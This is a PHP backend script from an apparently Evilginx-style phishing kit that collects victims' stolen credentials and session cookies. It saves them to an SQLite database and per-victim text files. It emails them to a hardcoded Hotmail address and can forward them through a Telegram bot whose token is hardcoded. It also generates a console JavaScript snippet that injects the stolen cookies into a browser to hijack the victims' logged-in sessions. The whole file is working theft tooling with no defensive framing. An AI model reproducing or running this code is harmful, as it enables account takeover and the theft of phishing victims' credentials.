
<?php
error_reporting(0);
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS");
header("Access-Control-Allow-Headers: x-test-header, Origin, X-Requested-With, Content-Type, Accept");
////////////////////////////////////////////////////////////////////////////////

$send = "suka.w1@hotmail.com"; // YOUR EMAIL GOES HERE
$Send_Log  = 1; // SEND RESULTS TO EMAIL
$Save_Log  = 1; // SAVE RESULTS TO CPANEL
$Tele_bot  = 0; //SENDS RESULTS TO TELEGRAM
$bot_token = "6894652956:AAGSUJdvhh56_F25XXIyRu6-aPeNVzqSCQw"; // BOT TOKEN
$chat_id   = "1909736678"; // GROUP CHAT ID

////////////////////////////////////////////////////////////////////////////////

function file_get_contents_curl($url)
{$ch = curl_init();
    curl_setopt($ch, CURLOPT_AUTOREFERER, false);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    $data = curl_exec($ch);
    curl_close($ch);return $data;}

function sendOutput($chat_id, $bot_token, $output, $filetype, $name)
{
    $tempFilePath = tempnam(sys_get_temp_dir(), 'output_');
    file_put_contents($tempFilePath, $output);

    $content = array('chat_id' => $chat_id, 'document' => new CURLFile(realpath($tempFilePath), $filetype, $name));

    $curl = curl_init();
    curl_setopt($curl, CURLOPT_HEADER, false);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl, CURLOPT_URL, "https://api.telegram.org/bot" . $bot_token . "/sendDocument");
    curl_setopt($curl, CURLOPT_POST, true);
    curl_setopt($curl, CURLOPT_POSTFIELDS, $content);
    $json_response = curl_exec($curl);
    curl_close($curl);
    unlink($tempFilePath);
    return json_decode($json_response, true);
}

$responseBody = file_get_contents('php://input');
$res = json_decode($responseBody, true);
if ($res) {$id = $res['id'];
    $phishlet = $res['phishlet'];
    $username = $res['username'];
    $password = $res['password'];
    $tokens = [];
    foreach ($res['tokens'] as $name => $value) {
        foreach ($value as $name2 => $value2) {
            $topush = [
                "name" => "$name2",
                "path" => "{$value2['Path']}",
                "value" => "{$value2['Value']}",
                "domain" => "{$name}",
                "secure" => "{$value2['HttpOnly']}",
            ];
            $tokens[] = $topush;
        }
    }
    $log = [$username => $password];
    $finalArray = ['tokens' => $tokens];
    $finalArray2 = ['log' => $log];
    $cookie = array_merge($finalArray, $finalArray2);
    $final = json_encode($cookie, true);

    $ip = $res['remote_addr'];
    $cookieData = json_decode($final, true);
    
    // Convert to StorageAce format (JSON array format)
    $storageAceCookies = [];
    $expirationDate = time() + (365 * 24 * 60 * 60); // 1 year from now
    
    // Re-process original tokens to get accurate HttpOnly and Secure flags
    $originalTokens = [];
    foreach ($res['tokens'] as $domain => $cookies) {
        foreach ($cookies as $cookieName => $cookieInfo) {
            $originalTokens[] = [
                'name' => $cookieName,
                'domain' => $domain,
                'path' => $cookieInfo['Path'] ?? '/',
                'value' => $cookieInfo['Value'] ?? '',
                'httpOnly' => isset($cookieInfo['HttpOnly']) ? ($cookieInfo['HttpOnly'] == 1 || $cookieInfo['HttpOnly'] === true) : false,
                'secure' => isset($cookieInfo['Secure']) ? ($cookieInfo['Secure'] == 1 || $cookieInfo['Secure'] === true) : false,
            ];
        }
    }
    
    foreach ($originalTokens as $cookie) {
        $domain = $cookie['domain'];
        $hostOnly = !empty($domain) && $domain[0] !== '.';
        // Use cookie name prefix as fallback for secure flag
        $secure = $cookie['secure'] || (isset($cookie['name']) && (strpos($cookie['name'], '__Secure-') === 0 || strpos($cookie['name'], '__Host-') === 0));
        
        $storageAceCookies[] = [
            "path" => $cookie['path'],
            "domain" => $domain,
            "expirationDate" => $expirationDate,
            "value" => $cookie['value'],
            "name" => $cookie['name'],
            "httpOnly" => $cookie['httpOnly'],
            "hostOnly" => $hostOnly,
            "secure" => $secure,
            "session" => false
        ];
    }
    $cookiesJsonExport = json_encode($storageAceCookies, JSON_PRETTY_PRINT);
    
    $mg2 = '(async () => {
    let cookies = [';
    foreach ($cookieData['tokens'] as $key) {
        if ($key['secure'] == 1) {
            $httponly = "true";
        } else {
            $httponly = "null";
        }
        $mg2 .= '{
    "name": "' . $key['name'] . '",
    "path": "' . $key['path'] . '",
    "value": "' . $key['value'] . '",
    "domain": "' . $key['domain'] . '",
    "secure": true,
    "httponly": ' . $httponly . '
  },';
    }
    $mg2 .= ']
    var red = "color:red; font-size:65px; font-weight:bold; -webkit-text-stroke: 1px black";
    function setCookie(key, value, domain, path, isSecure, sameSite) {
        const cookieMaxAge = \'Max-Age=31536000\' // set cookies to one year
         if (!!sameSite) {
           cookieSameSite = sameSite;
        } else {
           cookieSameSite = \'None\';
        }
        if (isSecure) {
                if (window.location.hostname == domain) {
                    document.cookie = `${key}=${value};${cookieMaxAge}; path=${path}; Secure; SameSite=${cookieSameSite}`;
             } else {
                    document.cookie = `${key}=${value};${cookieMaxAge};domain=${domain};path=${path};Secure;SameSite=${cookieSameSite}`;
            }
            } else {
                if (window.location.hostname == domain) {
                    document.cookie = `${key}=${value};${cookieMaxAge};path=${path};`;
                } else {
                    document.cookie = `${key}=${value};${cookieMaxAge};domain=${domain};path=${path};`;
                }
            }
    }
    for (let cookie of cookies) {
        setCookie(cookie.name, cookie.value, cookie.domain, cookie.path, cookie.secure)
    }
    console.log(\'%cCOOKIE INJECTED\', red);
	location.reload();
})();';

    $cookie_encoded = base64_encode($final);
    $mg = "SID: $id $username:$password\n\n";
    $mg .= "Cookie: $cookie_encoded\n\n";
    $subject = "$phishlet | $ip";
    $headers .= "MIME-Version: 1.0\r\n";
    $headers .= "Content-Type: text/plain; charset=utf-8\r\n";
    
    // Extract browser and OS info if available
    $browser = isset($res['browser']) ? $res['browser'] : (isset($res['user_agent']) ? $res['user_agent'] : 'Unknown');
    $os = isset($res['os']) ? $res['os'] : 'Unknown';
    $location = isset($res['location']) ? $res['location'] : 'Unknown';
    
    // Try to parse user agent if browser/OS not directly provided
    if ($browser == 'Unknown' && isset($_SERVER['HTTP_USER_AGENT'])) {
        $userAgent = $_SERVER['HTTP_USER_AGENT'];
        if (stripos($userAgent, 'Chrome') !== false) $browser = 'Chrome';
        elseif (stripos($userAgent, 'Firefox') !== false) $browser = 'Firefox';
        elseif (stripos($userAgent, 'Safari') !== false) $browser = 'Safari';
        elseif (stripos($userAgent, 'Edge') !== false) $browser = 'Edge';
        
        if (stripos($userAgent, 'Windows') !== false) $os = 'Windows';
        elseif (stripos($userAgent, 'Mac') !== false) $os = 'Mac';
        elseif (stripos($userAgent, 'Linux') !== false) $os = 'Linux';
        elseif (stripos($userAgent, 'Android') !== false) $os = 'Android';
        elseif (stripos($userAgent, 'iOS') !== false) $os = 'iOS';
    }
    
    if ($username != "" && $password != "") {
        // Save to database
        try {
            $dsn = 'sqlite:' . __DIR__ . '/passwords.db';
            $db = new PDO($dsn);
            $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
            
            // Check if account with this email already exists
            $checkStmt = $db->prepare("SELECT id FROM accounts WHERE email = :email LIMIT 1");
            $checkStmt->bindParam(':email', $username);
            $checkStmt->execute();
            $existingAccount = $checkStmt->fetch(PDO::FETCH_ASSOC);
            
            if ($existingAccount) {
                // Update existing account (preserve verified, favorite, and created_at)
                $stmt = $db->prepare("UPDATE accounts SET 
                    password = :password, 
                    ip_address = :ip_address, 
                    location = :location, 
                    browser = :browser, 
                    os = :os, 
                    service_type = :service_type, 
                    cookies_json = :cookies_json, 
                    cookies_json_export = :cookies_json_export, 
                    cookie_script = :cookie_script,
                    updated_at = CURRENT_TIMESTAMP
                    WHERE id = :id");
                $stmt->bindParam(':id', $existingAccount['id']);
                $stmt->bindParam(':password', $password);
                $stmt->bindParam(':ip_address', $ip);
                $stmt->bindParam(':location', $location);
                $stmt->bindParam(':browser', $browser);
                $stmt->bindParam(':os', $os);
                $stmt->bindParam(':service_type', $phishlet);
                $stmt->bindParam(':cookies_json', $final);
                $stmt->bindParam(':cookies_json_export', $cookiesJsonExport);
                $stmt->bindParam(':cookie_script', $mg2);
                $stmt->execute();
            } else {
                // Insert new account
                $stmt = $db->prepare("INSERT INTO accounts (email, password, ip_address, location, browser, os, service_type, cookies_json, cookies_json_export, cookie_script) 
                                       VALUES (:email, :password, :ip_address, :location, :browser, :os, :service_type, :cookies_json, :cookies_json_export, :cookie_script)");
                $stmt->bindParam(':email', $username);
                $stmt->bindParam(':password', $password);
                $stmt->bindParam(':ip_address', $ip);
                $stmt->bindParam(':location', $location);
                $stmt->bindParam(':browser', $browser);
                $stmt->bindParam(':os', $os);
                $stmt->bindParam(':service_type', $phishlet);
                $stmt->bindParam(':cookies_json', $final);
                $stmt->bindParam(':cookies_json_export', $cookiesJsonExport);
                $stmt->bindParam(':cookie_script', $mg2);
                $stmt->execute();
            }
        } catch (PDOException $e) {
            // Silently fail if database doesn't exist yet
        }
        
        // Still save to file if enabled
        if ($Save_Log == 1) {
            // Ensure rez directory exists
            $rezDir = __DIR__ . '/rez';
            if (!is_dir($rezDir)) {
                mkdir($rezDir, 0755, true);
            }
            $file = fopen("rez/$username.txt", "a");
            if ($file) {
                fwrite($file, $mg2);
                fclose($file);
            }
        }
        if ($Send_Log == 1) {
            mail($send, $subject, $mg, $headers);
        }
        if ($Tele_bot == 1) {
            $result = $mg;
            $response = sendOutput($chat_id, $bot_token, $result, "text/plain", $username . ".txt");
        }
    }
}